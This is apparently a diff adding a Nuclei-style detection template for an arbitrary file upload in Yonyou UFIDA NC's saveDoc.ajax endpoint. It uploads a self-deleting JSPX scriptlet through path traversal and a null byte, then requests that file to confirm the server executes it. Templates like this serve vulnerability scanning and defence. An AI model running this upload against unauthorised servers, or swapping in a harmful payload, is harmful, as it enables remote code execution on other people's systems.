@@ -1,0 +1,52 @@
+id: poc-yaml-yonyou-ufida-nc-savedoc-ajax-arbitrary-file-upload
+info:
+  name: Yonyou UFIDA NC saveDoc.ajax Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        POST /uapws/saveDoc.ajax?ws=/../../{{t1}}.jspx%00 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        content=<hi xmlns:hi="http://java.sun.com/JSP/Page">
+              <hi:directive.page import="java.util.*,java.io.*,java.net.*"/>
+           <hi:scriptlet>
+                    out.println("{{t2}}");new java.io.File(application.getRealPath(request.getServletPath())).delete();
+           </hi:scriptlet>
+        </hi>
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - ""
+        part: body
+
+  - raw:
+      - |
+        GET /uapws/{{t1}}.jspx HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
+      - type: word
+        words:
+          - "text/xml"
+        part: header
